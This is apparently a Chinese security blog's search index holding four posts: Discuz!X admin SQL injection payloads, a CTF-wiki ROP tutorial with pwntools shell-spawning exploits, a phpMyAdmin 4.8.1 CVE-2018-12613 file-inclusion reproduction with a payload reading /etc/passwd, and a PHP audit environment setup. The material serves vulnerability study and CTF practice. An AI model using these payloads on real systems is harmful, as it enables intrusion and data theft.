<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DiscuzX全版本后台sql注入</title>
      <link href="/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="angularjs">1&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); -- -</code></pre><h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><pre><code class="angularjs">1&#39; into outfile &#39;1.txt&#39;; -- -</code></pre><p><img src="../../../../img/dz1.png" alt=""><br><img src="../../../../img/dz2.png" alt=""><br><img src="../../../../img/dz3.png" alt=""><br><img src="../../../../img/dz4.png" alt=""><br><img src="../../../../img/dz5.png" alt=""><br><img src="../../../../img/dz6.png" alt=""><br><img src="../../../../img/dz7.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP - CTFwiki</title>
      <link href="/2019/11/26/ROP-CTFwiki/"/>
      <url>/2019/11/26/ROP-CTFwiki/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text</a></p></blockquote><pre><code class="bash">wget https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text -O ret2textfile ret2text //看到是 32 位动态链接// 拖进 ida， gets 栈溢出checksec ret2text // 只有 NXgdb ret2text</code></pre><p><img src="../../../../img/rop1.jpg" alt=""></p><p><img src="../../../../img/rop2.jpg" alt=""><br>buf 到 saved ebp 是 0x6c，再加 0x4 到 return address。所以 offset 是 112。</p><p>相当于是 return to plt，ida 里面简单看了下，有后门函数 secure：</p><p><img src="../../../../img/rop3.jpg" alt=""></p><p>return to 0x804863A 即可 getshell：</p><p>exp：</p><pre><code class="python">from pwn import *# p = process(&quot;./&quot;)p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]# elf = ELF(&quot;./&quot;)payload = &quot;\x90&quot;*(0x6c+4) + p32(0x804863A)p.sendline(payload)p.interactive()</code></pre><p><img src="../../../../img/rop4.jpg" alt=""></p><h2 id="ret2shellcode-NX-off"><a href="#ret2shellcode-NX-off" class="headerlink" title="ret2shellcode (NX off)"></a>ret2shellcode (NX off)</h2><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode</a></p></blockquote><pre><code class="bash">checksec ret2shellcode</code></pre><p>没有保护，开了 NX 就意味着有 rwx 段，可以从 gdb 中 vmmap 看到，或者 </p><pre><code class="bash">cat /proc/`pidof ret2shellcode`/maps</code></pre><ol><li>get 处 offset 不变，还是 112</li><li>覆盖返回地址，retrun to gets 的 plt entry </li><li>用这个新的 gets 将 shellcode 读到 buf 上  </li><li>同时跳转到 buf 执行 shellcode 即可</li></ol><p>exp：</p><pre><code class="bash">from pwn import *p = process(&quot;./ret2shellcode&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&#39;./ret2shellcode&#39;)gdb.attach(p)p.sendline(&quot;\x90&quot;*112 + p32(elf.symbols[&#39;gets&#39;]) + p32(elf.bss()) + p32(elf.bss()))# shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;# shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;# shellcode += &quot;\x0b\xcd\x80&quot;shellcode = asm(shellcraft.sh())p.sendline(shellcode)p.interactive()</code></pre><h2 id="ret2syscall（NX-on）"><a href="#ret2syscall（NX-on）" class="headerlink" title="ret2syscall（NX on）"></a>ret2syscall（NX on）</h2><p>动态链接是没有 int 0x80 之类的指令的，这里的文件自然也是 static。 </p><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop</a></p></blockquote><p>offset 和前面一样还是 112，不同的是 NX 开启，不能像 ret2shellcode 那样读 shellcode 到一个 buf。这里用 ret2syscall:</p><p>所需要各个寄存器的值：</p><ol><li>eax 为 0xb，也就是 execve 调用号</li><li>ebx 为 ‘/bin/sh’ 字符串的地址</li><li>ecx 和 edx 为0</li></ol><p>关于 linux 系统调用可以参考：</p><blockquote><p><a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">https://syscalls.kernelgrok.com/</a></p></blockquote><p>借助 ROPgadget：</p><pre><code class="bash">ROPgadget --binary ./ret2syscall --only &quot;int&quot;ROPgadget --binary ./ret2syscall --only=&quot;pop|ret&quot; | grep &quot;eax&quot;ROPgadget --binary ./ret2syscall --only=&quot;pop|ret&quot; | grep &quot;edx&quot;ROPgadget --binary ./ret2syscall --str=&quot;/bin/sh&quot;</code></pre><p>exp:</p><pre><code class="python">from pwn import *p = process(&quot;./ret2syscall&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]# elf = ELF(&quot;./&quot;)# eax = 11,ebx = sh_addr,ecx = edx = 0 pop_eax = 0x080bb196pop_edx_ecx_ebx = 0x0806eb90sys_addr = 0x08049421sh_addr = 0x080be408gdb.attach(p)payload = &#39;\x90&#39;*112 + p32(pop_eax) + p32(11) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(sh_addr) + p32(sys_addr)p.sendline(payload)p.interactive()</code></pre><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="ret2libc1-NX-on"><a href="#ret2libc1-NX-on" class="headerlink" title="ret2libc1 (NX on)"></a>ret2libc1 (NX on)</h3><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1</a></p></blockquote><p>offset 不变，可以通过 <code>elf.symbols[&#39;system&#39;]</code> 得到 system 的地址，再用 <code>ROPgadget --binary ./ret2libc1 --str &#39;/bin/sh</code> 拿到 /bin/sh 的地址即可。</p><p>exp:</p><pre><code class="python">from pwn import *p = process(&quot;./ret2libc1&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&quot;./ret2libc1&quot;)sh_addr = 0x08048720# system = 0x8048460payload = &#39;\x90&#39;*112 + p32(elf.symbols[&#39;system&#39;]) + p32(0xdeadbeef) + p32(sh_addr)gdb.attach(p)p.sendline(payload)p.interactive()</code></pre><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><blockquote><p>程序下载链接: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2</a></p></blockquote><p>和刚才不同的是，ROPgadget 找不到 /bin/sh 这个字符串。所以可以先 ret 到 gets 的 plt，把 /bin/sh 读到 buf 上，再调用 system 并且传递参数 buf。</p><p>利用 gets 函数的溢出，我在栈上这样布局：</p><pre><code class="python">padding # buf-&gt;ebp+saved ebp 112gets@pltsystem@plt # 此处是 gets@plt entry 的 retaddrbuf_addr #elf.bss() 附近 # 此处是 gets@plt 的第一个参数buf_addr #elf.bss() 附近 # 此处是 system@plt 的第一个参数</code></pre><ol><li>在 gets 处溢出，控制 retaddr 为 gets 的 plt entry</li><li>利用新的 gets 把 /bin/sh 读到 buf 中，新的 gets 的 retaddr 为 system 的 plt entry</li><li>调用 system@plt，参数为刚才读好了 /bin/sh 的 buf</li></ol><p>exp:</p><pre><code class="python">from pwn import *p = process(&quot;./ret2libc2&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&quot;./ret2libc2&quot;)gets_plt = elf.symbols[&#39;gets&#39;]system_plt = elf.symbols[&#39;system&#39;]payload = &#39;\x90&#39;*112 + p32(gets_plt) + p32(system_plt) + p32(elf.bss()) + p32(elf.bss())# gdb.attach(p)p.sendline(payload)p.interactive()</code></pre><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><blockquote><p>程序下载链接： <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3</a></p></blockquote><p>这一次没有 system 也没有 /bin/sh。梳理一下我们要做的事：</p><ol><li>先用一次 ROP return 到 puts ，泄漏 libcbase addr，其实也就是先用 puts 等函数印出一个已经调用过的函数的 got ，并 return 回 main，再减去该函数在 libc 中的 offset，offset 可以通过 readelf -s 等方式得到。(通常选择<code>__libc_start_main</code>，因为它是 main 函数的调用者，必定已经调用过)</li><li>拿到 libcbase addr，就可以加上 system 在 libc 中的 offset，通过 libcbase + system offset 拿到 system addr</li><li>同理，用 /bin/sh 的 offset + libcbase 得到 /bin/sh 的 addr</li><li>再一次 ROP 回 main，用 system 和 /bin/sh 开 shell</li></ol><p>栈布局：</p><pre><code class="python">- ROP1:padding1 # 112puts@pltmain@plt__libc_start_main@got- ROP2:padding2 # 104system@plt0xdeadbeef # anything 4 bytes/bin/sh addr</code></pre><p>exp:</p><pre><code class="python">from pwn import *from LibcSearcher import *p = process(&quot;./ret2libc3&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&quot;./ret2libc3&quot;)gdb.attach(p)puts_plt = elf.symbols[&#39;puts&#39;]main_plt = elf.symbols[&#39;main&#39;]libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]payload1 = &#39;a&#39;*112 + p32(puts_plt)+p32(main_plt) + p32(libc_start_main_got)p.sendlineafter(&quot;Can you find it !?&quot;,payload1)libc_start_main_addr = u32(p.recv()[0:4])print libc_start_main_addrlibc = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)system_addr = libcbase + libc.dump(&#39;system&#39;)sh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)payload2 = &#39;a&#39;*104 + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)one_gadget_addr = libcbase + 0x3ac5c # this one is good# one_gadget_addr = libcbase + 0x3ac5e# one_gadget_addr = libcbase + 0x3ac62# one_gadget_addr = libcbase + 0x3ac69 # this one is good# one_gadget_addr = libcbase + 0x5fbc5 # this one is good# one_gadget_addr = libcbase + 0x5fbc6 # this one is good# payload2 = &#39;a&#39;*104 + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)# payload2 = &#39;a&#39;*104 + p32(one_gadget_addr)ret = 0x8048406payload2 = p32(ret)*30 + p32(one_gadget_addr)p.sendline(payload2)p.interactive()</code></pre><p>需要注意的问题：</p><ol><li>选择：ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386)，也就是 3。</li><li>padding2 比 padding1 少 8 字节，原因是第二次 retrun 回 main 中，有栈对齐的指令 <code>0x804861b &lt;main+3&gt; and esp, 0xfffffff0</code>。不过一般确定第二次 padding 大小，就是加上 gdb.attach(p)，在 get@plt 下断，然后手动再判断一次长度。<strong>或者使用 rop slide 也可以，也就是在栈上放置多个 ret 指令。</strong></li><li>第二次 return 回 main 之后，也可以不用找 system 和 /bin/sh ，选择 one-gadget 也可以。</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 4.8.1 远程文件包含漏洞(CVE-2018-12613)</title>
      <link href="/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/"/>
      <url>/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>mac + php5.6 + apache + mysql5.5 + xdebug-2.5.5</p><p>phpmyadmin 4.8.1 下载链接： </p><ul><li><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip" target="_blank" rel="noopener">https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip</a></li></ul><p><strong>确保 mysql 启动无误。</strong></p><p>下载并移动 phpmyadmin 源代码到本地 web 根目录中，修改配置文件：</p><pre><code class="bash">cp config.sample.inc.php config.inc.php</code></pre><p>修改 <code>config.inc.php</code> 文件：</p><p><img src="../../../../img/phpmyadmin1.png" alt=""></p><p>安装完成。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h3><p>index.php ：55 行左右</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>通过 get 方式传入的 target 参数，有可能进入 include 函数，从而导致任意文件包含。 但是要经过上述几个判断，简单梳理一下 target 需要满足的条件：</p><ol><li>参数不为空，且是 string 类型</li><li>不能以 index 开头</li><li>不能在黑名单中（import.php exprot.php）</li><li>通过 <code>Core::checkPageValidity</code> 方法的判断</li></ol><p>跟进 <code>Core::checkPageValidity</code>：</p><pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = []){    if (empty($whitelist)) {        $whitelist = self::$goto_whitelist;    }    if (! isset($page) || !is_string($page)) {        return false;    }    if (in_array($page, $whitelist)) {        return true;    }    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    return false;}</code></pre><p>不管哪一种情况，都要求 page 参数满足 isset 和 is_string 。这是肯定满足的，我们主要梳理一下这一段代码对 page 参数的其他要求：</p><ol><li>首先获取一个白名单</li><li>page 参数在白名单中</li><li>page 参数截取第一个 <code>?</code> 前的子串，子串在白名单中</li><li>page 参数先 url 解码后，再截取第一个 <code>?</code> 前的子串，子串在白名单中</li></ol><p>梳理下攻击思路：</p><ol><li>白名单是已知的，这里随便选一个 db_datadict.php 。</li><li>既然我们走到了 include 这里，那就尽可能让传进来的参数，任意满足上面一种情况，并且仍然可以通过目录穿越，包含到任意文件。<br><img src="../../../../img/phpmyadmin2.jpg" alt=""></li></ol><h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><pre><code class="php">/index.php?target=db_datadict.php%253f/../../../../../../../../../etc/passwd</code></pre><p>该 payload 使得 page 参数满足最后一种条件，也就是 url 解码后，截取第一个问号 <code>?</code> 之前的子串，子串（db_datadict.php）在白名单中。</p><p><img src="../../../../img/phpmyadmin3.png" alt=""></p><p><img src="../../../../img/phpmyadmin4.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计环境搭建</title>
      <link href="/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="mac-mamp-xdebug"><a href="#mac-mamp-xdebug" class="headerlink" title="mac mamp + xdebug"></a>mac mamp + xdebug</h1><h2 id="install-required-libraries"><a href="#install-required-libraries" class="headerlink" title="install required libraries"></a>install required libraries</h2><pre><code class="angular2html">brew install openldap libiconv</code></pre><h2 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h2><pre><code class="angular2html">sudo apachectl stopsudo launchctl unload -w /System/Library/LaunchDaemons/org.apache.httpd.plist 2&gt;/dev/nullbrew install httpdsudo brew services start httpd</code></pre><h2 id="Multiple-Versions-PHP"><a href="#Multiple-Versions-PHP" class="headerlink" title="Multiple Versions PHP"></a>Multiple Versions PHP</h2><pre><code class="angular2html">brew tap exolnet/homebrew-deprecatedbrew install php@5.6brew install php@7.0brew install php@7.1brew install php@7.2brew install php@7.3</code></pre><h2 id="PHP-Switcher-Script-sphp"><a href="#PHP-Switcher-Script-sphp" class="headerlink" title="PHP Switcher Script (sphp)"></a>PHP Switcher Script (sphp)</h2><pre><code class="angular2html">curl -L https://gist.githubusercontent.com/rhukster/f4c04f1bf59e0b74e335ee5d186a98e2/raw &gt; /usr/local/bin/sphpchmod +x /usr/local/bin/sphp</code></pre><p>example:</p><pre><code class="angular2html">Switching to php@7.1Switching your shellUnlinking /usr/local/Cellar/php@5.6/5.6.40... 319 symlinks removedUnlinking /usr/local/Cellar/php@7.0/7.0.33... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.1/7.1.32_1... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.2/7.2.23... 0 symlinks removedUnlinking /usr/local/Cellar/php/7.3.10... 208 symlinks removedLinking /usr/local/Cellar/php@7.1/7.1.32_1... 25 symlinks createdIf you need to have this software first in your PATH instead consider running:  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/bin:$PATH&quot;&#39; &gt;&gt; ~/.zshrc  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/sbin:$PATH&quot;&#39; &gt;&gt; ~/.zshrcYou will need sudo power from now onSwitching your apache confRestarting apachePHP 7.1.32 (cli) (built: Oct  6 2019 20:44:48) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies    with Zend OPcache v7.1.32, Copyright (c) 1999-2018, by Zend TechnologiesAll done!</code></pre><p>切换为 php 5.6 ：<br><img src="../../../../img/2.jpg" alt=""></p><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><pre><code class="angular2html">pecl install xdebug</code></pre><p>随后在 vscode 或者 phpstorm 中配置 xdebug 即可。</p><h3 id="vscode-安装-xdebug-："><a href="#vscode-安装-xdebug-：" class="headerlink" title="vscode 安装 xdebug ："></a>vscode 安装 xdebug ：</h3><p>比较简单，直接安装 vscode 插件 phpdebug 即可，也不需要特别多的配置。</p><p><img src="../../../../img/3.jpg" alt=""><br><img src="../../../../img/4.jpg" alt=""></p><h3 id="phpstorm-安装-xdebug-："><a href="#phpstorm-安装-xdebug-：" class="headerlink" title="phpstorm 安装 xdebug ："></a>phpstorm 安装 xdebug ：</h3><p>相对复杂一点：</p><p><img src="../../../../img/5.png" alt=""><br><img src="../../../../img/6.png" alt=""><br><img src="../../../../img/7.png" alt=""></p><p>然后就可以开始尽情的代码审计了。<br><strong>没有断点，不用动态调试的代码审计，等于白给。</strong></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions" target="_blank" rel="noopener">https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
